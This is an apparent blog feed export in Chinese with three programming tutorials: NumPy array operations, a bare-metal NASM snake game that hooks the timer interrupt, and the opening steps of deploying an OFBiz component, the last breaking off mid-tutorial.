<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange( <span class="number">4</span> )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sin() 正弦函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.sin(a)</span><br><span class="line">array([<span class="number">0.</span>        , <span class="number">0.84147098</span>, <span class="number">0.90929743</span>, <span class="number">0.14112001</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># cos() 余弦函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.cos(a)</span><br><span class="line">array([ <span class="number">1.</span>        ,  <span class="number">0.54030231</span>, -<span class="number">0.41614684</span>, -<span class="number">0.9899925</span> ])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp() e^x函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.exp(a)</span><br><span class="line">array([ <span class="number">1.</span>        ,  <span class="number">2.71828183</span>,  <span class="number">7.3890561</span> , <span class="number">20.08553692</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># mean() 均值函数，也可以a.mean()</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.mean(a)</span><br><span class="line"><span class="number">1.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># std() 标准差函数，也可以a.std()</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.std(a)</span><br><span class="line"><span class="number">1.118033988749895</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sqrt() 开根函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.sqrt(a)</span><br><span class="line">array([<span class="number">0.</span>        , <span class="number">1.</span>        , <span class="number">1.41421356</span>, <span class="number">1.73205081</span>])</span><br></pre></td></tr></table></figure>

<h3 id="2-4-索引与切片"><a href="#2-4-索引与切片" class="headerlink" title="2.4. 索引与切片"></a>2.4. 索引与切片</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标索引，与原生数组类似</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[-<span class="number">1</span>]</span><br><span class="line">array([ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 赋值 + 切片的运用。a[0][::2]表示：第一行中从头到尾遍历，每次加2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>][::<span class="number">2</span>] = -<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[-<span class="number">1</span>,  <span class="number">1</span>, -<span class="number">1</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出指定的行或列，注意在同一中括号中，如：[0:1,1]</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>:<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">array([<span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>:<span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">array([<span class="number">1</span>, <span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[:, <span class="number">1</span>]</span><br><span class="line">array([<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>])</span><br></pre></td></tr></table></figure>

<h3 id="2-5-形状操控"><a href="#2-5-形状操控" class="headerlink" title="2.5. 形状操控"></a>2.5. 形状操控</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">12</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改形状，需要原形状匹配，比如：12 = 3x4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单纯调用函数，不会改变原数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新赋值才会改变</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = a.reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.shape</span><br><span class="line">(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变成一维</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = a.ravel()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = a.reshape(<span class="number">2</span>,<span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装置矩阵</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.T</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">6</span>],</span><br><span class="line">       [ <span class="number">1</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">2</span>,  <span class="number">8</span>],</span><br><span class="line">       [ <span class="number">3</span>,  <span class="number">9</span>],</span><br><span class="line">       [ <span class="number">4</span>, <span class="number">10</span>],</span><br><span class="line">       [ <span class="number">5</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动整形</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.reshape(<span class="number">3</span>,-<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br></pre></td></tr></table></figure>

<h3 id="2-6-合并"><a href="#2-6-合并" class="headerlink" title="2.6. 合并"></a>2.6. 合并</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.floor(<span class="number">10</span>*np.random.random((<span class="number">2</span>,<span class="number">2</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">8.</span>,  <span class="number">8.</span>],</span><br><span class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.floor(<span class="number">10</span>*np.random.random((<span class="number">2</span>,<span class="number">2</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">1.</span>,  <span class="number">8.</span>],</span><br><span class="line">       [ <span class="number">0.</span>,  <span class="number">4.</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 垂直方向合并</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.vstack((a,b))</span><br><span class="line">array([[ <span class="number">8.</span>,  <span class="number">8.</span>],</span><br><span class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>],</span><br><span class="line">       [ <span class="number">1.</span>,  <span class="number">8.</span>],</span><br><span class="line">       [ <span class="number">0.</span>,  <span class="number">4.</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 水平方向合并</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.hstack((a,b))</span><br><span class="line">array([[ <span class="number">8.</span>,  <span class="number">8.</span>,  <span class="number">1.</span>,  <span class="number">8.</span>],</span><br><span class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>,  <span class="number">0.</span>,  <span class="number">4.</span>]])</span><br></pre></td></tr></table></figure>

<h3 id="2-7-转换"><a href="#2-7-转换" class="headerlink" title="2.7. 转换"></a>2.7. 转换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b_numpy = np.array(a_list) <span class="comment"># python原生列表转numpy数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b_numpy</span><br><span class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c_list = b_numpy.tolist() <span class="comment"># numpy数组转列表</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c_list</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>nasm汇编实现贪吃蛇</title>
    <url>/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>出于汇编语言课程设计要求，设计一个由nasm汇编语言编写的贪吃蛇程序，可在“裸机”上运行。</p>
<p>详细代码见<a href="https://github.com/99MyCql/dou-loader/blob/master/src/dou-snake.asm">github</a>。</p>
<span id="more"></span>

<h2 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1. 需求分析"></a>1. 需求分析</h2><ul>
<li>一个正常的贪吃蛇程序</li>
<li>由nasm汇编语言编写</li>
<li>在“裸机”上单独运行，或由自创加载器加载运行</li>
</ul>
<h2 id="2-数据结构设计"><a href="#2-数据结构设计" class="headerlink" title="2. 数据结构设计"></a>2. 数据结构设计</h2><p>需要设定的<strong>全局变量</strong>如下：</p>
<ul>
<li><p><code>snake</code>: 蛇身，由N个结点组成(由于纯汇编只有静态数组，所以必须固定蛇身长度的上限进行内存分配)。每个结点4字节，包含的数据如下：</p>
<ul>
<li>结点位置：<ul>
<li>行号，1字节</li>
<li>列号，1字节</li>
</ul>
</li>
<li>方向，1字节</li>
<li>图案，1字节</li>
</ul>
</li>
<li><p><code>snake_len</code>: 蛇长度，4字节</p>
</li>
<li><p><code>dir</code>: 方向，1字节</p>
</li>
<li><p><code>speed</code>: 蛇前进速度，1字节</p>
</li>
<li><p><code>fruit_pos</code>: 果子位置，2字节：</p>
<ul>
<li>行号，1字节</li>
<li>列号，1字节</li>
</ul>
</li>
<li><p><code>score</code>: 分数，4字节</p>
</li>
<li><p><code>xxx_msg</code>: 各类提示信息，字符串形式</p>
</li>
<li><p><code>is_game_over</code>: 游戏是否结束，1字节</p>
</li>
</ul>
<p><strong>全局常量</strong>如下：</p>
<ul>
<li><code>snake_len_max</code>: 蛇身最大长度</li>
<li><code>snake_head_pat</code>: 蛇头图案</li>
<li><code>snake_node_pat</code>: 蛇身结点图案</li>
</ul>
<h2 id="3-程序流程架构"><a href="#3-程序流程架构" class="headerlink" title="3. 程序流程架构"></a>3. 程序流程架构</h2><p>在贪吃蛇程序中，应该包含两个“线程”，线程A负责等待用户按键，线程B负责 snake 的前进、检查、更新等操作。</p>
<p>两个线程不受另一方影响，比如线程A在等待用户按键而停滞时，线程B会让 snake 不断前进。</p>
<p>那么问题来了，汇编怎么实现多线程呢？</p>
<p>其实，我们平时遇见的多线程(多进程)，本质上是快速交替运行的程序。而在某一个时刻，只有一个程序在CPU运行，但由于快速(毫秒级)交替运行，所以我们看起来<strong>像是同时运行的</strong>。究其本质，是由操作系统根据一个定时器中断，每过一会儿(毫秒)就帮我们切换运行程序，从而营造出来的假象。(不考虑多CPU)</p>
<p>所以，问题的关键在于<strong>定时器中断</strong>。首先，它并不是由操作系统提供，而是由硬件产生，所以在没有操作系统的“裸机”上，也能实现多线程&#x2F;进程。</p>
<p>综上所述，我们只需要将线程B交给定时器中断调用，而线程A由自己运行，那么就可以实现两者同时运行、互不影响。</p>
<p>在下述流程中，<code>Begin</code>即线程A，<code>new_int_1CH</code>即线程B。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Begin:</span><br><span class="line">    clear() 清屏</span><br><span class="line">    printStr() 打印提示信息</span><br><span class="line">    等待用户按键。。。</span><br><span class="line">    设置 new_int_1CH() 函数为 INT <span class="number">1</span>CH 中断程序。使得每过一段时间就会执行 new_int_1CH() 函数</span><br><span class="line">    <span class="keyword">while</span> 全局变量 is_game_over == <span class="number">0</span>:</span><br><span class="line">        等待用户按键。。。</span><br><span class="line">        根据按键设置全局变量 dir</span><br><span class="line">    printStr() 打印游戏结束信息</span><br><span class="line">    retf</span><br><span class="line"></span><br><span class="line">new_int_1CH:</span><br><span class="line">    snakeMove() 蛇前进</span><br><span class="line">    snakeShow() 显示蛇</span><br><span class="line">    snakeCheck() 检查蛇是否撞到自己或者边界</span><br><span class="line">    <span class="keyword">if</span> 撞到:</span><br><span class="line">        还原 INT <span class="number">1</span>CH 中断程序(在关中断的环境下进行)</span><br><span class="line">        设置全局变量 is_game_over = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> 吃到果子:</span><br><span class="line">            蛇尾结点++</span><br><span class="line">            蛇长度++</span><br><span class="line">            分数++</span><br><span class="line">            速度++</span><br><span class="line">            fruitShow() 显示下一个果子</span><br></pre></td></tr></table></figure>

<p>自顶向下设计，不考虑子函数的实现细节。</p>
<h2 id="4-难点分析"><a href="#4-难点分析" class="headerlink" title="4. 难点分析"></a>4. 难点分析</h2><ul>
<li>定时器，定时移动snake</li>
<li>生成随机数</li>
</ul>
<p>解决方案：</p>
<ul>
<li><p><code>INT 8</code>定时器中断，每过55ms就会被触发一次。在<code>INT 8</code>中断程序中，会调用<code>INT 1CH</code>中断，而原本的<code>INT 1CH</code>程序只包含一条返回语句。所以，只需重写<code>INT 1CH</code>中断程序，即可实现定时器功能。</p>
</li>
<li><p>获取随机数：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 0h					; 间隔定时器</span><br><span class="line">out 43h, al					; 通过端口43h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h</span><br><span class="line">in al, 40h					; 访问3次，保证随机性</span><br><span class="line">mov bl, 20</span><br><span class="line">div bl						; ax/bl(20) = al......ah</span><br><span class="line">mov al, ah					; 余数</span><br><span class="line">mov ah, 0</span><br><span class="line">add al, 1					; 1-20的随机数</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-具体实现"><a href="#5-具体实现" class="headerlink" title="5. 具体实现"></a>5. 具体实现</h2><p>代码见<a href="https://github.com/99MyCql/dou-loader/blob/master/src/dou-snake.asm">github</a>。</p>
<p>由于生成的贪吃蛇二进制程序超过512字节，不能单独做为<code>MBR</code>程序，所以需要由加载器加载，方能运行。</p>
<p>加载器代码见<a href="https://github.com/99MyCql/dou-loader">dou-loader</a>。</p>
<p>运行截图如下：</p>
<p><img src="/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87/4.png" alt="1"></p>
<p>输入<code>7</code>，进入贪吃蛇程序：</p>
<p><img src="/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87/1.png" alt="1"></p>
<p><code>Enter</code>键开始：</p>
<p><img src="/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87/2.png" alt="1"></p>
<p>按<code>w</code>,<code>d</code>,<code>s</code>,<code>a</code>键，上右下左移动贪吃蛇。撞到边界或者自身，游戏结束：</p>
<p><img src="/nasm%E6%B1%87%E7%BC%96%E5%86%99%E8%B4%AA%E5%90%83%E8%9B%87/3.png" alt="1"></p>
<h2 id="6-心得"><a href="#6-心得" class="headerlink" title="6. 心得"></a>6. 心得</h2><p>项目总结：</p>
<ul>
<li>贪吃蛇程序的分析——2小时</li>
<li>编写贪吃蛇程序——8小时</li>
<li>代码行数——580</li>
</ul>
<p>此次项目的完成进度超出预算，其原因如下：</p>
<ul>
<li>前期基础准备，加载器、时钟中断、键盘中断、IO中断等程序的编写，充分锻炼了汇编代码编写能力。</li>
<li>编码前的项目程序分析十分关键，这使得编码有目的、有依据，而不是凭空想象。其实，这就是软件工程的作用之处，需求分析、概要设计、详细设计、难点解决等。</li>
<li>相对完善、便于理解的注释，一手编码一手注释，很关键。</li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ofbiz学习之部署组件1</title>
    <url>/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B61.html</url>
    <content><![CDATA[<h3 id="一、创建组件"><a href="#一、创建组件" class="headerlink" title="一、创建组件"></a>一、创建组件</h3><p>右键点击ofbiz根目录下的build.xml——Run as(运行方式)——Ant构建(第二个)——在“选择要执行的目标”的框中——取消start——找到create component打钩——点击运行——在出现的输入框中都输入组建的名字learning——最后一步选择Y——完成——刷新左边的资源管理视图——hot-deploy下出现learning组件目录</p>
<span id="more"></span>

<h3 id="二、初始部署"><a href="#二、初始部署" class="headerlink" title="二、初始部署"></a>二、初始部署</h3><h4 id="1、修改learning-x2F-ofbiz-component-xml文件中的webapp标签："><a href="#1、修改learning-x2F-ofbiz-component-xml文件中的webapp标签：" class="headerlink" title="1、修改learning&#x2F;ofbiz-component.xml文件中的webapp标签："></a>1、修改learning&#x2F;ofbiz-component.xml文件中的webapp标签：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">webapp</span> <span class="attr">name</span>=<span class="string">&quot;learning&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">title</span>=<span class="string">&quot;learning&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">server</span>=<span class="string">&quot;default-server&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">location</span>=<span class="string">&quot;webapp/learning&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">base-permission</span>=<span class="string">&quot;OFBTOOLS&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">mount-point</span>=<span class="string">&quot;/learning&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app-bar-display</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>base-permission代表登陆权限，app-bar-display&#x3D;”true”表示该应用会在后台应用主菜单中出现。</p>
<h4 id="2、初次体验。"><a href="#2、初次体验。" class="headerlink" title="2、初次体验。"></a>2、初次体验。</h4><p>启动ofbiz，浏览器进入后台目录管理界面，点击左上角的应用菜单，再点击learning，进入应用主页面。如果页面中显示“不允许你浏览这个页面。”，不必担心，这只是你未做任何添加前的自动生成页面。</p>
<h4 id="3、创建controller。"><a href="#3、创建controller。" class="headerlink" title="3、创建controller。"></a>3、创建controller。</h4><p>在learning&#x2F;webapp&#x2F;learning&#x2F;WEB-INF&#x2F;controller.xml中，添加一个请求映射：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;FindProductPlan&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FindProductPlan&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据请求映射，再添加一个响应的view视图映射：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://learning/widget/learningScreens.xml#FindProductPlan&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4、创建视图。"><a href="#4、创建视图。" class="headerlink" title="4、创建视图。"></a>4、创建视图。</h4><p>在learning&#x2F;widget&#x2F;learningScreens.xml中，添加一个name&#x3D;FindProductPlan的screen视图装饰器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;headerItem&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ProductPlan&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;main-decorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">	                    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">		                     <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span><br><span class="line">		                         <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;FindScreenDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://common/widget/CommonScreens.xml&quot;</span>&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;menu-bar&quot;</span>&gt;</span></span><br><span class="line">		                                 <span class="tag">&lt;<span class="name">container</span> <span class="attr">style</span>=<span class="string">&quot;button-bar&quot;</span>&gt;</span></span><br><span class="line">		                                     <span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">text</span>=<span class="string">&quot;新建&quot;</span> <span class="attr">style</span>=<span class="string">&quot;buttontext create&quot;</span>/&gt;</span></span><br><span class="line">		                                 <span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;search-options&quot;</span>&gt;</span></span><br><span class="line">		                                 <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/learningForms.xml&quot;</span>/&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;search-results&quot;</span>&gt;</span></span><br><span class="line">		                                 <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ListProductPlan&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/learningForms.xml&quot;</span>/&gt;</span></span><br><span class="line">		                             <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">		                         <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span><br><span class="line">		                     <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span><br><span class="line">		                 <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关于ofbiz装饰器的配置规则，请参考<em>Apache+OFBiz+开发初学者指南.chm</em>（关于此份文档如何获取，请浏览本文结尾）。而在该装饰器中，外围嵌套了名为main-decorator(在CommonScreens.xml中)的主装饰器，负责页面的主体装饰。内层嵌套了名为FindScreenDecorator的装饰器，该装饰器主要分为两部分：search-options(搜索选项)和search-results(搜索结果)。在这两部分中分别布置一个搜索表单和列表表单。</p>
<h4 id="5、创建表单。"><a href="#5、创建表单。" class="headerlink" title="5、创建表单。"></a>5、创建表单。</h4><p>在learning&#x2F;widget&#x2F;learningForms.xml中，添加name&#x3D; FindProductPlan和name&#x3D;ListProductPlan的表单：</p>
